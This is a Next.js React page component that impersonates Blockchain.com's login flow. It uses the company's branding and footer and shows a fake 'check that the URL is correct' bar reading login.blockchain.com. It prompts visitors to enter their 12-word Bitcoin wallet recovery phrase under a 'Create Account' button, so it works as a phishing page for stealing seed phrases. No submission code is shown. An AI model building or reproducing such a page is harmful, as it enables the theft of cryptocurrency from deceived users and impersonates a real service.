import CryptoDesk from "@/assets/crypto-desk.svg";
import CryptoMobile from "@/assets/crypto-mobile.svg";
import Image from "next/image";
import Link from "next/link";

export default function Crypto() {
  return (
    <div className="w-full h-full flex flex-col justify-between">
      <div className="flex justify-between items-center p-2">
        <div>
          <Image
            className="hidden md:block"
            src={CryptoDesk}
            width={200}
            height={50}
            alt={"CryptoDesk"}
          />
          <Image
            src={CryptoMobile}
            width={20}
            height={20}
            alt={"CryptoDesk"}
            className="md:hidden block"
          />
        </div>

        <button className="text-white hover:bg-white hover:text-pink-400 font-medium transition-all duration-500 ease-in-out border-white border-[1px] rounded-[50px] px-3 py-2 h-[42px]">
          Sign Up
        </button>
      </div>

      <div className="p-8 h-[93vh] w-full bg-[rgb(240,242,247)] rounded-t-[25px] flex flex-col justify-start items-center">
        <div className="rounded-[50px] bg-[rgba(13,53,120,0.06)] py-[4px] px-[16px] text-[rgb(124,135,156)] font-semibold w-full flex flex-col justify-center items-center">
          <span>Check that the URL is correct. &nbsp;</span>
          <span className="flex items-center">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="15"
              height="15"
              fill="#677184"
              viewBox="0 0 24 24"
              cursor="auto"
              aria-label=""
              style={{ cursor: "inherit" }}
            >
              <path
                fill-rule="evenodd"
                d="M19 11a2 2 0 0 0-2-2V7A5 5 0 0 0 7 7v2a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2zM9 7v2h6V7a3 3 0 1 0-6 0m3 10.5a2 2 0 1 0 0-4 2 2 0 0 0 0 4"
                clip-rule="evenodd"
              ></path>
            </svg>
            <span>https://login.blockchain.com</span>
          </span>
        </div>

        <div className="relative mt-6 p-[24px] bg-white rounded-[25px] w-full min-h-[200px]">
          <Link href={"/connect-wallet"} className="absolute left-8 top-8 p-3">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              fill="#121D33"
              viewBox="0 0 24 24"
              cursor="auto"
              aria-label=""
              style={{ cursor: "inherit" }}
            >
              <path
                fill-rule="evenodd"
                d="M14.707 6.293a1 1 0 0 0-1.414 0l-5 5a1 1 0 0 0 0 1.414l5 5a1 1 0 0 0 1.414-1.414L10.414 12l4.293-4.293a1 1 0 0 0 0-1.414"
                clip-rule="evenodd"
              ></path>
            </svg>
          </Link>

          <div className="w-full flex flex-col items-center justify-center">
            <div className="h-[88px] w-[88px] rounded-full bg-[rgb(240,242,247)] flex items-center justify-center">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="66"
                height="66"
                fill="#121D33"
                viewBox="0 0 24 24"
                cursor="auto"
                aria-label=""
                style={{ cursor: "inherit" }}
              >
                <path
                  fill-rule="evenodd"
                  d="m10.5 11.914 1.58 1.58-.989.97H10a1 1 0 0 0-1 1v1.121L6.586 19H5v-1.586zM9.205 8.81c.008.56.09 1.045.171 1.398l-6.083 6.084A1 1 0 0 0 3 17v3a1 1 0 0 0 1 1h3a1 1 0 0 0 .707-.293l3-3A1 1 0 0 0 11 17v-.536h.5a1 1 0 0 0 .7-.287l1.584-1.555c.354.082.841.164 1.405.173 1.167.018 2.712-.281 4.018-1.588 2.546-2.546 2.219-6.196 0-8.414s-5.868-2.546-8.414 0C9.486 6.099 9.187 7.643 9.205 8.81M15 6a1 1 0 1 0 0 2c.175 0 .433.097.668.332S16 8.825 16 9a1 1 0 1 0 2 0c0-.825-.402-1.567-.918-2.082C16.567 6.402 15.825 6 15 6"
                  clip-rule="evenodd"
                ></path>
              </svg>
            </div>

            <h3 className="text-[20px] text-center mt-6 font-[600] leading-[30px] text-[rgb(18,29,51)]">
              Input your Bitcoin wallet&apos;s Recovery Phrase
            </h3>
            <span className="text-[rgb(103,113,132)] text-[16px] font-[500] leading-[24px] my-4 text-center">
              Your 12 word Recovery Phrase will create a new Blockchain.com
              account. If an account is found, you will be prompted to reset
              your password. Please input it in the order specified.
            </span>

            <textarea
              name=""
              style={{ width: "calc(100% - 48px)" }}
              className="py-[12px] text-black border-[1px] border-solid border-transparent px-[16px] min-h-[120px] rounded-[16px] text-[16px] outline-blue-400 bg-[rgb(240,242,247)]"
              placeholder="Enter your 12 word Recovery Phrase"
              id=""
            ></textarea>
            <div className="text-[#CF1726] text-[12px] font-normal leading-[18px] flex justify-start w-full ml-[50px] text-left">
              Separate each word with a space
            </div>

            <button className="bg-[rgb(12,108,242)] rounded-[32px] w-full py-[12px] md:mt-[4rem] mt-[5px]">
              Create Account
            </button>
          </div>
        </div>

        {/* footer */}
        <div className="text-[rgb(103,113,132)] text-center mt-8">
          <h4>© Blockchain.com. All rights reserved. Version | 🇺🇸 English</h4>
        </div>
      </div>
    </div>
  );
}
